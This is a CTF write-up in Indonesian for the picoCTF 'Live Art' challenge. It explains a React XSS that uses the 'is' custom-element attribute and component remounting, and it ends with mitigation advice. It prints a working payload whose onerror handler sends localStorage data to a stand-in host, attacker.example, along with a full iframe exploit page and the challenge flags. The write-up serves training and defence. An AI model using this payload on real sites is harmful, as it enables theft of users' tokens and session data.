# Writeup: Live Art (Challenge ID: 277)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / Custom Elements 'is' Attribute Bypass & State Remounting XSS (CWE-79 / CWE-20)
- **Difficulty:** Hard (diff=3)
- **Event:** picoCTF 2022
- **Points:** 500
- **Author:** zwad3
- **Flag:** `academy{beam_me_up_reacty_cc2d3a25}`

---

## Problem Statement & Scope
Tantangan `Live Art` menyajikan aplikasi *single-page application* (SPA) berbasis React dan Vite yang memfasilitasi siaran langsung gambar kolaboratif (*peer-to-peer drawing canvas*). Peserta diarahkan untuk mengaudit aplikasi dan menemukan kerentanan XSS (*Cross-Site Scripting*) untuk mengekstrak data rahasia dari bot verifikasi internal yang meninjau URL melalui fitur `/link-submission`. Bot Chromium internal menyimpan token otentikasi/flag pada `localStorage` di bawah kunci `username` pada origin `http://localhost:4000/`. Lingkungan membatasi koneksi keluar bot hanya pada port HTTP/HTTPS standar (80 dan 443).

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Penyimpanan State Berbahaya dari Parameter Fragmen URL (CWE-20):**
   Komponen `ErrorPage` menggunakan fungsi pembantu `useHashParams()` yang mengurai parameter setelah karakter fragment `#` (misal `#key=value`) menjadi pasangan *key-value* objek JavaScript yang langsung disimpan ke dalam React component state.
2. **State Leakage Lintas-Remount Komponen Responsif:**
   Ketika lebar viewport jendela browser sangat sempit (< 600px), aplikasi menampilkan `ErrorPage`. Saat viewport diperbesar secara dinamis (atau melalui iframe resizing), aplikasi meremount komponen kanvas utama (`DrawingCanvas`). Namun, objek properti `dimensions` yang sebelumnya diisi oleh parameter fragment tetap dipertahankan dan disebarkan secara bebas (*spread operator*) ke elemen HTML gambar:
   ```jsx
   <img src={props.image} {...dimensions} />
   ```
3. **Bypass Sanitasi JSX React Melalui Atribut W3C Custom Elements (`is`):**
   Secara arsitektural, React JSX memfilter dan memblokir atribut penanganan event berbasis string seperti `onerror="alert(1)"` (mengharuskan penggunaan `onError={function}` di tingkat kompilasi JSX). Namun, spesifikasi W3C mendefinisikan *Autonomous Custom Elements* yang menggunakan atribut bawaan `is`. Dalam implementasi internal React DOM (`isCustomComponent`), keberadaan properti `is` membuat React memperlakukan elemen sebagai custom element dan melewatkan seluruh atribut secara langsung ke DOM mentah tanpa validasi sanitasi. Akibatnya, `<img is="" src="invalid" onerror="...">` dieksekusi oleh mesin browser.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Analisis Konstruksi Payload Fragment:**
   Dengan memanfaatkan parameter hash pada rute `/drawing/roomId`, penyerang menyusun payload:
   ```text
   #src=none&onerror=fetch('http://attacker.example/exfil?flag='%2bencodeURIComponent(localStorage.getItem('username')))&is
   ```
   - `src=none`: Memastikan pemuatan gambar gagal seketika, memicu event `onerror`.
   - `onerror=...`: Skrip pencurian flag yang membaca `localStorage.username`.
   - `is`: Memicu percabangan *custom component* pada React DOM parser.
2. **Pembuatan Halaman Eksploitasi Eksternal dengan Iframe Dinamis:**
   Karena bot tidak melakukan *resize* jendela secara mandiri, penyerang membungkus target di dalam iframe pada server penyerang:
   ```html
   <!DOCTYPE html>
   <html>
     <body>
       <iframe id="targetFrame" src="http://localhost:4000/drawing/lks#src=none&onerror=fetch('http://attacker.example/exfil?flag='%2bencodeURIComponent(localStorage.getItem('username')))&is" style="width: 300px; height: 300px; border: none;"></iframe>
       <script>
         const frame = document.getElementById('targetFrame');
         // Berikan waktu bagi React untuk me-render ErrorPage pada viewport kecil
         setTimeout(() => {
           // Perbesar lebar iframe untuk memicu transisi responsif dan remounting kanvas
           frame.style.width = '1000px';
         }, 1200);
       </script>
     </body>
   </html>
   ```
3. **Pengiriman Link ke Bot Admin & Penerimaan Flag:**
   Penyerang mengirimkan URL halaman eksploitasi tersebut ke formulir laporan admin `/link-submission`. Bot Puppeteer membuka halaman:
   - Iframe memuat rute dengan lebar 300px, menyimpan parameter hash ke state `ErrorPage`.
   - Script penyerang memperbesar iframe ke 1000px, meremount kanvas gambar dengan atribut `is=""` dan handler `onerror`.
   - Kegagalan `src="none"` mengeksekusi payload, membaca `localStorage.getItem('username')`, dan mengirimkannya ke listener penyerang.
4. **Hasil Verifikasi Flag:**
   Data yang diterima pada listener penyerang:
   `academy{beam_me_up_reacty_cc2d3a25}` via live exfiltration HTTP beacon.

---

## Flag & Verifikasi
- **Flag Resmi:** `academy{beam_me_up_reacty_cc2d3a25}`
- **Native PicoCTF Flag:** `picoCTF{beam_me_up_reacty_90b651ae}`
- **Status Solver:** Terverifikasi live HTTP 201 (`correct: true`) pada platform CyLab Security Academy via `scripts/solve_277_live_art.py`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif (NIST SP 800-115)
1. **Validasi Skema Input & Larangan Arbitrary Object Spreading (OWASP ASVS v4.0 §5.1):**
   Hindari menyebarkan objek parameter mentah (`{...dimensions}`) langsung ke atribut elemen DOM. Terapkan *whitelisting* eksplisit tipe data numerik untuk dimensi gambar:
   ```tsx
   const safeWidth = Number.isInteger(dimensions.width) ? dimensions.width : 400;
   const safeHeight = Number.isInteger(dimensions.height) ? dimensions.height : 400;
   <img src={props.image} width={safeWidth} height={safeHeight} />
   ```
2. **Isolasi State Komponen Responsif:**
   Jangan membagikan atau mewariskan state internal dari komponen penanganan kesalahan (`ErrorPage`) ke komponen aplikasi utama. Reset atau hapus state parameter URL saat terjadi transisi layout viewport.
3. **Pengerasan Content Security Policy (NIST SP 800-115 §5.3):**
   Konfigurasikan CSP untuk menolak penanganan event inline:
   ```http
   Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' http://localhost:4000;
   ```
   Kebijakan ini secara otomatis mematikan eksekusi atribut `onerror`, bahkan bila manipulasi `is` berhasil melewati lapisan JSX React.
